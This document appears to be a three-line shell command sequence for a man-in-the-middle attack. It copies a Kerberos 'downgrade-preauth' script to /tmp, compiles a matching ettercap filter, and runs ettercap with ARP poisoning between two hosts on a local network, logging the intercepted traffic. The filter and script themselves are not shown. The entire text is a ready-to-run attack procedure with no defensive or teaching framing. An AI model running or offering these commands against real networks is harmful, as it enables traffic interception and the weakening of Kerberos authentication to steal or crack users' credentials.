cp krb5-downgrade-preauth.py /tmp
etterfilter krb5-downgrade-preauth.filter -o krb5-downgrade-preauth.ef
sudo ettercap -T -M arp:remote -i enp0s3 -F krb5-downgrade-preauth.ef /192.168.1.11// /192.168.1.27// |tee /tmp/ettercap.log
